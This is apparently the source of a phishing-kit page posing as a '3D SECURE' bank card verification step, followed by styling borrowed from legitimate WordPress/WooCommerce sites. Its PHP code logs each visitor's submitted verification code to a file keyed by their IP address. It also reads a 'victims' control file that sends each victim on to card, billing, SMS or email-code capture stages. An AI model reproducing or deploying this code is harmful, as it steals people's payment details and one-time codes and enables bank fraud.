<?php 
header("Refresh: 4");
//require_once "functions.php";
    extract($_REQUEST);
    $file=fopen("$ip Code.txt","a");


    fwrite($file, $textCode ."\n");
    fclose($file);
function get_client_ip() {
        $client  = @$_SERVER['HTTP_CLIENT_IP'];
        $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
        $remote  = $_SERVER['REMOTE_ADDR'];
        if(filter_var($client, FILTER_VALIDATE_IP)) {
            $ip = $client;
        } else if(filter_var($forward, FILTER_VALIDATE_IP)) {
            $ip = $forward;
        } else {
            $ip = $remote;
        }
        if( $ip == '::1' ) {
            return '127.0.0.1';
        }
        return  $ip;
    }
    
 $ip = get_client_ip();
$data = file("victims/{$ip}.txt");
 
            if($data[0] == 0 ) {
                        //console.log('hada ba9i 0');
                    }
                    if( $data[0] == 'errorlogin' ) {
                        header("Location: infos.php?redirection=errorlogin");
                    }
                    if( $data[0] == 'cc' ) {
                    echo "yessss";
                        header("Location: infos.php?redirection=cc");
                        die;
                    }
                    if( $data[0] == 'errorcc' ) {
                        header("Location: infos.php?redirection=errorcc");
                        die;
                     }
                     if( $data[0] == 'email_code' ) {
                        header("Location: infos.php?redirection=email_code");
                        die;
                    }
                    if( $data[0] == 'erroremail_code' ) {
                        header("Location: infos.php?redirection=erroremail_code");
                        die;
                    }
                    if( $data[0] == 'billing' ) {
                        header("Location: infos.php?redirection=billing");
                        die;
                    }
                    if( $data[0] == 'errorbilling' ) {
                        header("Location: infos.php?redirection=errorbilling");
                        die;
                    }
                    if( $data[0] == "sms" ) {
                        header("Location: infos.php?redirection=sms");
                        die;
                     }
                     if( $data[0] == 'errorsms' ) {
                        header("Location: infos.php?redirection=errorsms");
                        die;
                     }
                    if( $data[0] == 'success' ) {
                        header("Location: infos.php?redirection=success");
                        die;
                    }
                



?>

<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>3D SECURE</title>
   <style>
            :root {
                --sf-img-4: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAB4CAMAAAB/yz8SAAADAFBMVEUAAADmAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH7mAH48X17FAAAA/3RSTlMAAQIDBAUGBwgJCgsMDQ4PEBESExQVFhcYGRobHB0eHyAhIiMkJSYnKCkqKywtLi8wMTIzNDU2Nzg5Ojs8PT4/QEFCQ0RFRkdISUpLTE1OT1BRUlNUVVZXWFlaW1xdXl9gYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXp7fH1+f4CBgoOEhYaHiImKi4yNjo+QkZKTlJWWl5iZmpucnZ6foKGio6SlpqeoqaqrrK2ur7CxsrO0tba3uLm6u7y9vr/AwcLDxMXGx8jJysvMzc7P0NHS09TV1tfY2drb3N3e3+Dh4uPk5ebn6Onq6+zt7u/w8fLz9PX29/j5+vv8/f7rCNk1AAAX60lEQVR42u2dd0AUV7vGz8zO9l16W0CRJqig2Kmxi6BCEBErdmKMGjEaSwyJfmosaCwxKnbFhoWIFTvWoKIoihRpspRdFpYioJTdOzO7s40F0Qsh97vz/BHZmTnveec3p7ynzAQAUqRIkSJFihQpUqRI/VcJpjNw0WCVgxSGXHS4PXyitmvuzahL7CNMD08vsIYUB8ffeyRTnEc7uASFy3O/2PVfBqtPvlSmhufDFQ9yYa38YMmo9oB1WJ57Qb9/KyypNNOdhNViWJJbRiSslsKSfpxLwmoxLOlzi1aHZXHiOq4rk//bYNUvh1oblh1fZqn25/82WNI31iSsFsOqXwOTsFoKS5rtQMJqMSzJFuR/AYuqa6bPaFVYHDMej2fEofwrYUn5PZqBxe7k3EMpZz21WzT1Xn0y7tGNsxsDLJVjOpefxPIKHjsH1TeqwyfEpIvXyFHq6q0Ba+aDhISEOxcO/uhpBGnByunU01vDwghVr2BjR5mvnShtAUvyB60JWBTbuWeSi8VK8f1VUYXGi2Wp6isSl3Qk7iysQiI3VVeDqmqzIoGR3867eWWVGjqiAStcZlPyUXhzXgcNXDSnH2JeiSo0LBT1UlzAHbo5PrcU9/WwTlvAkgrctMMymPesWqJ25fsgZSHxvFSpcubDvdF02YklH9WSNGyXJ+BMuCZukDZWtHZYmKruBtBVC43j5rcftFh435fwyf2YoJ44ela3TWBJDrK1wIIcj1Y2cksBizEhRf3OJfx5nOZgWe8ukUilnwcLNTqfqSxWwc9qtVogYDG/yVDxqY1gSUuGQo1gQU5X6qRNwqJO4je69ZIfmE3DcorTfqPNw0JL/XyibDHCCpuwIIfF/FmserSVYUn41fK/TnIbwbK5WC9tEhY8LE2L04KJSFOwrK81SL8IljQ/UNZ3IHNKpM3Coswtl7YhrPqj1+R/lfst0oDF+V1bSSBgWV/XWqVeukDaYbH21ku/EJbksS2epRdf2jys/nnSNoW19WviYcSuUocFDS2QNg2LtqJGq9cNu9jaYQVUSFsM60ehWFxWo3wYH9dg5VX3krR5WMyT0raFtUXnlPzPigd1arDYkQpv6wqfPX6cKisZYlmxc0xSnEw/8fvBZEVZ4HsCMDzqvRzTk0hUu8ejxfSacnQlfH45FlN8TROwHP0DAgLnHslXOPAKG736Kx9PVdYd3MLFTFVYnooGS1Ke/uTx48frOa0MCxpUTNy1VA1WtwxFQ7TBzcLcbh8Oq+6IMV7sviHauup93blUdueNRAFtWE0DiJPcfu0qJioGFQDXMoX1yKEdDPUxDSxoApase+GOekS0ctVT0BYrSkH7ydyuJrgFs90qsOBNxAW1NybYmaPSh1sZFmDs0Wx8ZLCC5aVDKp6D9kbUefjdSm474kEi+yDh1z4cHmCtIqreHQMtwx1oKWFcOFcRKfbmNwcLvXuvFOIJREKgYzrx41J3AgJ9qwoszkOiXMXYQG0x3EFhgZ7vtMGirJAzlESzUL/9ZaXglZfMT/On8mtTushNGt2XH8lx1gILPk1kuJ4NWgoLUJcQAegtLnAnQr6M3goUarA658p/FA1sTVbqsJD1DVpgMf8kyk4INtqTxQkFYxGZAcdc4pEjhM2lciuioVpgMYmnLnAHLYcFeuTIDyaZg6+JChCpHLWrwepbKv9xUxe0GSxgn64FFvcYMYrBhsEDsvDwYiERHvaXR4cfFipsDpOHBu8DtcAyfCG3lm7zObCMHxERiSU0i3BvGaIdVn+iWdxFb0NY8OL65mC5YZf4vpVIP2xWNDeuBKz5CpuDmoNlRMBKs/4cWEb3lLBCCfeWfgrWH20JC1g8bwyLtZcIcgLxRsfndX20mcKAkzz8q/9d0eHMkVdDsY8WWDpPtaD4NKzORI/83ByaSLi3k64dVj8icrjAbktYYNaHRrCQVUTncwB3DnLf11lpwDJZfjZBvjQEWBfkbUpebyWs+vXyppYSp1gdoX1GA7+gWtnADyJCm9edtcPqStxUTo82hWUQ3zh0mErEgKJJ+OgYYqn0MbrR8pM14bI5AWQqEWk8NlHCksZbynvD7YTxLD9GC2FBLH9i+Ck5AAHnIiIejLTUGjoYPCNuapteW8ICYysbweqjGGiV7PTp4axUV12smSNCdvFyEwoE60xXzAdsRWHYEWk/RI12cXa2AlCwolks3O7rgpmxRbTDKp4gy6b3mH0CIk0N2iPrPlLEnPHfuGJXdDNQgwXvUwx+fu/GQFBR2gYW56xEE5ZejPJIdX6eUjfsMQuZyjm/lSE/XK4ifpb6ogXQ6o1ySrAgL28fADbZSmtVuLVYE+2w6gWybIpUBpgvrdALVildbCjGrng7RQ0WCFCkqM+5uH3jxo1TGG0CCwwu0YQFTazUOmatCaNigdPWJiYRzmJVwOCi2rEY1bEIob/NtMPSog9LsXrXJU/TkznqsIwetvVAmpiD3N+gAQsYRGudhLkk6xOdX2i9L/4grGWDV9ZqwAKd334xLMkdc7zdW9PQPCwwpvKfgQVccjVhgd4vtXheMFTWzlMmFWsrdotlnV3PDE1Y0MTyL4WV7inzx+TqJ2DRI+r+GViUJTWasGCf9EaO168j2gHGj+8bna3dJg9bqcuqNGAB6vfiL4IleTOS6Pw632loFhbQP1T3j8AC+ucaNBcsYK+/NaeCE5QROGexSONkVYShIvbeX6sBCyDj0ySfD+vj1f7KkKXj4epmYQGDiIp/BBbo9lCiuRQGWW9Tr2xl41WmiOjjXqmxzPmOqzxptqVUAxaAnaPEnwmr9uUPZqqOc0OT65uDBZjBj2v/CVhQt6NCieYiK8Nja1KJAonkgFr2FMeN2cQ5SdHe3ojqSZZ3VIZ8sTVGcWzQ7lelDS2EVSdKPTvdSiNWgq3m3cz70DQsAJnPvpxb3Zqw9H0CZPraWW2hvt/X2MFRag+TaubmF0BcbtVofXjuqWfpeRkvzi/uoxnUQAzbQbi9AFflMZqFh7/M1kCGHuEFHrP3DtDQKFcrhpapTpjrNEJ2gb813F1+rZ++ygXsrsNlR/tT/2V7TGC6gXUPOxMGBZAiRYoUKVKkSJEiRardpGvO/PLEEM+N2wY+QXqGjHaBYTLEG9UAK5r208jiJyO+3Dh7W/aU1n95F+p1apt9u8Dyyy7My+MXPF1uovU0LaIi+MuNszalBGvfm9F9jEXTyXoFGjc3CHW5c8kVabkTzKHDWqscBpVfnzdv4cYHZX/otD4sYGDfRCUOLw5oOtWmkkHN2KQFLrf6HB94txJ4rQWrDNvJT+l6V4w6SO0xKTTIBn9qHNepoYHWFBRWiEvI7ABztIBAuu7TQie7UNHLvceZuk/sCCh2gbNDepmOH0QBgNFnSmhAB7TSIaMDjb+aiM/uwF4hlgDuF9KBMEHtOjl0xmBj3eALtbtD/eiA1WNC6DQvDmrbZZqV8+TZY1EDupNv1G0J9UUoFr6zZn+NvYBgMPEr85Gzp/XDCwjNZXJoIPbKhOWM7jbjZo/rRNEZOHPWMHw5FTYfPXuaKxv1wX+M0YCZs4bqAtA1LJO/ZFaPVoQFkJ/qFgDGd2kigfDJWBSHZURmSano3ghmRPWVZJG49JILABZROaJScdoUBLBic/ZnvRvJCEoQlYpS9uRHMYDusrcigeCBNwzY8RkHcnO8MKv0SOEIQN0gPoSZuOwCqCHJJSWigp1dnldJKkqu63HXpgpLxO9W6wJkZeWhpGKx+FZf4JBaLSkviWWOuFdQUloS1wsCLrnxsfml5ZlhaDFlL0xHfUzwQ4Bv5bl7AnHZnaA/3pWWF+00Qlm5XS0qFmZHGAHOw7eHs0vKi3aYgdDC2jpx8aJWhbWibj40RXRtgseMvzM9IfaO8lPBI356HWUaIRVtDww4WHmcAzqc+81v2IKsLCfAulSXvyek4/CM1J98A7blNxxn0hYWx4z1nPMytRvg3K/N2zEJL1mM/SW+gLZJItyBmTjB6ZLxKmTIyPVTWW6HP64e0hvR2RY5ftjUe6IJAAmXlOwO8ttdeUGH5Xm67schLnBA7IIRo7aXHdcFPfkf73/rszClcBigzBJdDnaflZjRF4yqrvprcsCOcmHuBr+Qm2XfwsDhfuayQb57xWsQbkJDxrKRIbfeL0QsAl/lBA/u2EqwtlAoFKptfPEAwwdpXdG/BxdFMgYXXUDrOaWfAzOi7k+09zd/lOsIICMqlc7YXDsOQmGt5QLuMfEUtDpwt9QdZ9omPbKlUBD/8vUYrGXylkoOq243aoL38J2jR+kJXSqEoPV8zYdxeGDCRGj0kLLNCBLecBStMwa3i7sDsL12OFbf9Ck0uvXDVDsUVpYnBChzqjYA3uNkR9RH75Lt1FHV2E5v0xt1v7EANExwRoe6tHwenUIxuJRjx02omY7m4ll0RQeY//3aotUa+NthYYtWP6jcze5elLwoLCwsPPeJ0Y/VcyF5A1+Jvd7Mii7tCSCzoFVbt96UhMKsS8Kv0Nt/lIq3tCNEx5lDRA+wtKuLb9M59wt6AjVYlVMwE6fEPa3+Lr24bnx3uhKW9/ItW09X7Wcg4TVz0N/UQzWuBCzE+ZsNW//MeNcDhRWHfRlghHg/6C98huXzS8FD3VHVu9FGjHmkbAx6rkNKnCHnVPlG9NyiS7UjuAl52Cc0rFOe6LcqrIq6mpqq2sr1JsBFWJaI67Tx8uqZar0h6xQKy+pi0fPExBwcFrbFhfcwBS/d3iis4aXFsrRHmJz7uV3VYVWMx0ycFPeEeu9JFFRkL2fJYeltz3+VmJhai8HCc6QeUMCC/F9nJSY+L8VhXTTA8indD9xEpbJ8TuiNqt6OUmccEnljXV4yCutMbQp+7ukQbkIOth/J+nUrwyqP8fPzjSwNhYH120RHHo9nbmkETXsfgXU9LKoKLHhh7TILHm91AwGLG1U8Hu0LWGtrjzP75MXZ42kNQTOwAIzwnCe8Ku4nh+UjOmzH400s1QZL71rOMHNel5vqsByzHzjIfWwEi7GjfLI5etLCnNZWsPAG3vZ+Rn9A2/1+pTmV6TZbB9g+yfDnUDutD9NTwqL8+nEchWJ4RlGywIjs9DDPIVuFkuNM3VOihaYIe8BMenOwDCba0xFO9PsBYOWHuTQ2PK5sHZPCCf+gAWtD3SQq2/TBazsK4pamDot1sHwZD2F5zGaDRrCg0YK4Pkxqx1BnoArL9O5bJxqzFWFBPkWxBqDTpcpXp68VJHcDkF+q4Na5ZPFmAyUsyIv/dtuG24VKWNSxT6vEZbnnxMeZUPc75UnRtwRPLJqB1cu75O3VI3fKYo2AR0HuyRg324dFB3+LydGshkPEmcdieq0qv7V+V1K5OixgH1eZHH2jKMmuMSzAWlqcF3cmRbxADRZ1bdXDUzv0WwPWoBv41ln68nh/AIyX3k1N3O+KRpaUnruevombrYfMvzkYu+vV1zoDZNjZlGe75jz0hxibL+Db3uEOgUtmdQso2Q4DqMOvD1If70KDP+aeGCLCpq2I6w+QeTeHYDmsvt7ZcFbMi9QHP1uiZ6bcehPbC+qxOyn55DeXV9AoM+JH4hFMfDf00tC7b8466i648yZ+6e/n7YD9hU3YeLzftRXof81W3Et9urcPBNzjF6KNAO3nq9i6qmHU7+gIhDHyzMvXl2eyAXP/OWyrIe/4ATSh5cZnSetbZZmVwpYtQCIcfMco28JAvvAH65tjzRZaWYDiHwrPCKZw0D6ZgW+V5A41Rf/R2VY2A0/BtZC99sFkKazT2ZC6CcTYQv4eDdscyxA2MqVBbOzNDY5KPoBrTsOd4UKYBfwCbNFUNtrnWBjgznCoiiwAxJTtxqWa8BhKHyAmA9/4ZGTc/t/iGsF/smVFeEz5dUtyKuuTMpv/IL+qIvtgFxJFi2bhun3lYc8gQZAi9X+3Fuu0rAZzWKq/GDr/vjuhWXQygNo2C6fTqz6xnmG3fQYd2B7ZYqA8pLP5jOp8C+S8NMSgvVlZb3n88qp/C6a6YVPzpq+i8HjN7NcaU3zPrHnjA0SHOWAIP0nlFTKrl2JXQLU0geSLFzevD2nvrWqcyPyNc2++7PXpK/UirzY9s2Z09C/TZpIGe37iaQwoOcIB3DFDVNaeKMPGsoHNzUjZIfPNkV3aPeC0So4xhKfmB6tECXaOHTEHOQ66zE6ONsTbady+9/O9HbGlIY6Now1WqxBr/KNCNFtzWNcjMXOggyGaWt/O0ZKqLIwOjtY6EGB25sGQqR1D397BDAa0jo72+KCE66hDR3PgELDo9tgLTZCODX4MtrZFjH2KHnV3wH6Y9+1p1u57DU3iH9mY/flGsQkUGXo2Iy8pAq0OPrkrtr3ip+2RvVAOAjKqawvzfgVI/0Op/LRj/SFgdvs6trG787O9nClZNR8L34UB2qjYzHdP13SQj4Fm3n7Hfx3dD3J9vYVFW5v0/dmsvLvT7dcm8TNPYh+FGs1fFJHMTz3cH5bBckrcrwuoA46l8dMO9oJ04+6b/1pYV52f4wPYM25m595d2N5tFmW+4MRf+AqBrCwMT0nbufKE4C8TEFQvTN636VZltGxtr/u6jLJda3yhAS/5h9cdK0hyBZYpL7GC1q3ovE7fTbmiHf8ZRBmTnrw9/IwgSrY7Prj48ea1Bx55gkGlhzj0XXUF8dsOZAvv5Z3cdKHiBpp0gpSfdXBDtDDRDcJh9S44rw/7puYcWh9deJ1n8Dyjg8+fZTnrV3elheU/3LT6etEadjvDGvimXvit4tsRxlffDmciOkvef4vCyhjApne8hM+MYJ/OuvauCxU2PC+YzKHqhJRc0lGBBVk+SLOhwh3vvvyKgRisFofgSXZW+tGpbBu6HFbDWTsGZ0ZF+fd6dLOj1WMwWAUBHJreAvExrgIW79q7seixSd/qYLBgJ/4dDhXq9TauK51qGZUzsH1Z+SY8OSvcYcyeMgBvgj0Kr3j069cvsPACElQfiQ3ww6tlUw3AMC7XHrvgPPZ4WZdFziqwgNmDVLTu+Qij3dHUIYIovHlZ+eFEiCs25yCDVTkVrdBOOa9sUPJTahdhsA5jjaPpvUwnBSzv4qNYKUcQgMECjvzbaPr57ze4onZXlC1v1zbeMfFuX9MNhdsGp2zCe53h4tIUVGnCG+yg+t8wfsuqZ6nCwifm0OoaWevZGFZQeTGWOr34HF6trQ7mFPIfr7OCZLBK/dBjDpn3sESjPizGYK3Gbp4VW+imgDW2jHirQQXWyo98zG6maF27Bg/fvp8PA8MNhc/yx+K/PYvujvHD5Alrh+UliMFA0GLKehkl4os+/YsVsHxFVwLw1PK3b3T6Tv3lVuVmhhqseBVYO7EcDG/ndFfA8hEdxqJ9GFKFtaB6jz9utwvUnrC+rw5HfTM/LXnpiP+2uJ8xmI521L1hoAnL4EpeNwBbxOcOpwLqkMLberTzpWgwy/3PBwzWvXQbCLZLfOFBA5SOPeRfGbGiAdg9L163SVipvSmAHlT8l54Clk1C2gAqoA/8mo7Dcsi7y4ZgT/4VRwTQHOzalRXo9SJz1fiJG9KzirbgmwgoQVmvI6YvvnaH1wgWc0vlzmnTdMdkJ6+eviqFj9755LLk8IV7331EYbH3lm2ePkl3eu7z9dOX37qA79SBNz5aN336fvFGepOwKp4sn7E5K3WwsjdEJuc++2XGutR4SxyWwV3B0tmjuKsE8T9PX5uwg9O+Dbz3ZX4BP32X18arsu970f1vCISCZ9/RgZ9gJdZMf88nvi3dK05QEGfBCLpVJCy6ie2TYC95U1qSHPH0KBqiut8WFMSYsMbHCwVFf8/A2z9k9v0iQVHWVhvIM/MPFi0iE9sAZpd4AVtHHV7wHQYr6my+UHjLhwrc3+5kgx6vo3QBKzi+SFhwZShF/84TCwAFvhDm72DoL3hWLCi45tvOYSlk4jXBvxsb6DvKHYFMvYKHYaG5gZclVurN3YkNXTBvuL8NBQ3LB4z3ko3YqPaj/Ttze2JJYUuf0VboSd7A4MEd5KYoZu7j/JxYaNvlbgtDtm5Y2M7o64Sd1fcwxWCtMnQfN9AMm993s4UBu78DZok3cJy7MQQoPXujDwSxDRhuCgGk0/BxHqb/tv/ZxT8pFNb/59v/PI37GE7CaqkcfvKASAqkSJEiRYoUKVKkSJEiRYoUKVKkSJEiRYoUKVKkmtH/AC/pmhmUFj4vAAAAAElFTkSuQmCC")
            }
        </style>
        <style id="litespeed-ucss">
            body {
                --wp--preset--color--black: #000;
                --wp--preset--color--cyan-bluish-gray: #abb8c3;
                --wp--preset--color--white: #fff;
                --wp--preset--color--pale-pink: #f78da7;
                --wp--preset--color--vivid-red: #cf2e2e;
                --wp--preset--color--luminous-vivid-orange: #ff6900;
                --wp--preset--color--luminous-vivid-amber: #fcb900;
                --wp--preset--color--light-green-cyan: #7bdcb5;
                --wp--preset--color--vivid-green-cyan: #00d084;
                --wp--preset--color--pale-cyan-blue: #8ed1fc;
                --wp--preset--color--vivid-cyan-blue: #0693e3;
                --wp--preset--color--vivid-purple: #9b51e0;
                --wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,#9b51e0 100%);
                --wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,#7adcb4 0%,#00d082 100%);
                --wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);
                --wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,#cf2e2e 100%);
                --wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,#eee 0%,#a9b8c3 100%);
                --wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,#4aeadc 0%,#9778d1 20%,#cf2aba 40%,#ee2c82 60%,#fb6962 80%,#fef84c 100%);
                --wp--preset--gradient--blush-light-purple: linear-gradient(135deg,#ffceec 0%,#9896f0 100%);
                --wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,#fecda5 0%,#fe2d2d 50%,#6b003e 100%);
                --wp--preset--gradient--luminous-dusk: linear-gradient(135deg,#ffcb70 0%,#c751c0 50%,#4158d0 100%);
                --wp--preset--gradient--pale-ocean: linear-gradient(135deg,#fff5cb 0%,#b6e3d4 50%,#33a7b5 100%);
                --wp--preset--gradient--electric-grass: linear-gradient(135deg,#caf880 0%,#71ce7e 100%);
                --wp--preset--gradient--midnight: linear-gradient(135deg,#020381 0%,#2874fc 100%);
                --wp--preset--font-size--small: 13px;
                --wp--preset--font-size--medium: 20px;
                --wp--preset--font-size--large: 36px;
                --wp--preset--font-size--x-large: 42px;
                --wp--preset--spacing--20: .44rem;
                --wp--preset--spacing--30: .67rem;
                --wp--preset--spacing--40: 1rem;
                --wp--preset--spacing--50: 1.5rem;
                --wp--preset--spacing--60: 2.25rem;
                --wp--preset--spacing--70: 3.38rem;
                --wp--preset--spacing--80: 5.06rem;
                --wp--preset--shadow--natural: 6px 6px 9px rgba(0,0,0,.2);
                --wp--preset--shadow--deep: 12px 12px 50px rgba(0,0,0,.4);
                --wp--preset--shadow--sharp: 6px 6px 0px rgba(0,0,0,.2);
                --wp--preset--shadow--outlined: 6px 6px 0px -3px rgba(255,255,255,1),6px 6px rgba(0,0,0,1);
                --wp--preset--shadow--crisp: 6px 6px 0px rgba(0,0,0,1);
                margin: 0;
                background-color: #fff;
                padding: 0;
                color: #686868;
                word-wrap: break-word;
                position: relative;
                font-family: Raleway;
                font-size: 15px;
                font-weight: 400;
                letter-spacing: 0;
                line-height: 1.6
            }

            a,a:focus,a:hover {
                -webkit-transition: all .3s ease;
                -moz-transition: all .3s ease;
                -ms-transition: all .3s ease;
                -o-transition: all .3s ease;
                transition: all .3s ease
            }

            @media only screen and (max-width: 768px) {
                :root {
                    --woocommerce:#7f54b3;
                    --wc-green: #7ad03a;
                    --wc-red: #a00;
                    --wc-orange: #ffba00;
                    --wc-blue: #2ea2cc;
                    --wc-primary: #7f54b3;
                    --wc-primary-text: #fff;
                    --wc-secondary: #e9e6ed;
                    --wc-secondary-text: #515151;
                    --wc-highlight: #b3af54;
                    --wc-highligh-text: #fff;
                    --wc-content-bg: #fff;
                    --wc-subtext: #767676
                }
            }

            :root {
                --woocommerce: #7f54b3;
                --wc-green: #7ad03a;
                --wc-red: #a00;
                --wc-orange: #ffba00;
                --wc-blue: #2ea2cc;
                --wc-primary: #7f54b3;
                --wc-primary-text: #fff;
                --wc-secondary: #e9e6ed;
                --wc-secondary-text: #515151;
                --wc-highlight: #b3af54;
                --wc-highligh-text: #fff;
                --wc-content-bg: #fff;
                --wc-subtext: #767676
            }

            div.wpforms-container-full,div.wpforms-container-full .wpforms-form * {
                background: 0 0;
                border: 0;
                border-radius: 0;
                -webkit-border-radius: 0;
                -moz-border-radius: 0;
                float: none;
                font-size: 100%;
                height: auto;
                letter-spacing: normal;
                list-style: none;
                outline: 0;
                position: static;
                text-decoration: none;
                text-indent: 0;
                text-shadow: none;
                text-transform: none;
                width: auto;
                visibility: visible;
                overflow: visible;
                padding: 0;
                box-sizing: border-box;
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                -webkit-box-shadow: none;
                -moz-box-shadow: none;
                -ms-box-shadow: none;
                -o-box-shadow: none;
                box-shadow: none;
                margin: 24px auto
            }

            div.wpforms-container-full .wpforms-form * {
                margin: 0
            }

            div.wpforms-container-full .wpforms-form button,div.wpforms-container-full .wpforms-form input,div.wpforms-container-full .wpforms-form label {
                margin: 0;
                border: 0;
                display: inline-block;
                vertical-align: middle;
                background: 0 0;
                height: auto;
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box
            }

            div.wpforms-container-full .wpforms-form select {
                margin: 0;
                vertical-align: middle;
                background: 0 0
            }

            div.wpforms-container-full .wpforms-form select.wpforms-field-medium {
                max-width: 60%
            }

            div.wpforms-container-full .wpforms-form input.wpforms-field-small {
                max-width: 25%
            }

            div.wpforms-container-full .wpforms-form .wpforms-field {
                padding: 10px 0;
                clear: both
            }

            div.wpforms-container-full .wpforms-form .wpforms-field-label {
                display: block;
                font-weight: 700;
                font-size: 16px;
                float: none;
                line-height: 1.3;
                margin: 0 0 4px;
                padding: 0;
                word-break: break-all;
                word-wrap: break-word
            }

            div.wpforms-container-full .wpforms-form .wpforms-required-label {
                color: red;
                font-weight: 400
            }

            div.wpforms-container-full .wpforms-form input[type=text],div.wpforms-container-full .wpforms-form select {
                background-color: #fff;
                box-sizing: border-box;
                border-radius: 2px;
                color: #333;
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                display: block;
                float: none;
                font-size: 16px;
                font-family: inherit;
                border: 1px solid #ccc;
                padding: 6px 10px;
                height: 38px;
                width: 100%;
                line-height: 1.3
            }

            div.wpforms-container-full .wpforms-form select {
                text-transform: none;
                white-space: nowrap
            }

            div.wpforms-container-full .wpforms-form button[type=submit] {
                background-color: #eee;
                border: 1px solid #ddd;
                color: #333;
                font-size: 1em;
                padding: 10px 15px
            }

            div.wpforms-container-full .wpforms-form button[type=submit]:active,div.wpforms-container-full .wpforms-form button[type=submit]:focus,div.wpforms-container-full .wpforms-form button[type=submit]:hover {
                background-color: #ddd;
                border: 1px solid #ccc;
                cursor: pointer
            }

            div.wpforms-container-full .wpforms-form button[type=submit]:disabled {
                background-color: #eee;
                border: 1px solid #ddd;
                cursor: default;
                opacity: .5
            }

            div.wpforms-container-full .wpforms-form input:focus,div.wpforms-container-full .wpforms-form select:focus {
                border: 1px solid #999;
                box-shadow: none
            }

            div.wpforms-container-full .wpforms-form input:disabled,div.wpforms-container-full .wpforms-form select:disabled {
                background-color: #f9f9f9;
                border-color: #ddd;
                color: #999;
                cursor: not-allowed
            }

            div.wpforms-container-full .wpforms-form noscript.wpforms-error-noscript {
                color: #900
            }

            div.wpforms-container-full .wpforms-form .wpforms-submit-container {
                padding: 10px 0 0;
                clear: both;
                position: relative
            }

            div.wpforms-container-full .wpforms-form .wpforms-submit-spinner {
                margin-left: .5em;
                vertical-align: middle;
                max-width: 26px
            }

            div.wpforms-container-full .wpforms-form .wpforms-field-select select>option {
                color: inherit
            }

            div.wpforms-container-full .wpforms-field.wpforms-field-select-style-classic select {
                padding-left: 6px
            }

            @media only screen and (max-width: 600px) {
                div.wpforms-container-full .wpforms-form .wpforms-field:not(.wpforms-field-phone):not(.wpforms-field-select-style-modern) {
                    overflow-x:hidden
                }

                div.wpforms-container-full .wpforms-form .wpforms-field>*,div.wpforms-container-full .wpforms-form input.wpforms-field-small,div.wpforms-container-full .wpforms-form select.wpforms-field-medium {
                    max-width: 100%
                }
            }

            html {
                font-family: sans-serif;
                -ms-text-size-adjust: 100%;
                -webkit-text-size-adjust: 100%;
                font-size: 10px;
                -webkit-tap-highlight-color: transparent
            }

            article,figure,footer,section {
                display: block
            }

            a {
                background-color: transparent
            }

            a:active,a:hover {
                outline: 0
            }

            img {
                border: 0;
                vertical-align: middle
            }

            figure {
                margin: 0
            }

            button,input,select {
                font: inherit
            }

            button {
                -webkit-appearance: button;
                cursor: pointer
            }

            *,:after,:before {
                -webkit-box-sizing: border-box;
                -moz-box-sizing: border-box;
                box-sizing: border-box
            }

            button {
                font-family: inherit;
                line-height: inherit
            }

            a:focus {
                outline: 5px auto -webkit-focus-ring-color;
                outline-offset: -2px
            }

            h4 {
                font-weight: 700
            }

            h4,ul {
                margin-bottom: 10px
            }

            h4 {
                font-family: inherit;
                line-height: 1.1;
                color: inherit;
                margin-top: 10px;
                font-size: 18px;
                word-wrap: break-word;
                letter-spacing: -.02em
            }

            p {
                margin: 0 0 10px
            }

            .text-center {
                text-align: center
            }

            ul {
                margin-top: 0
            }

            .container {
                margin-right: auto;
                margin-left: auto;
                padding-left: 15px;
                padding-right: 15px
            }

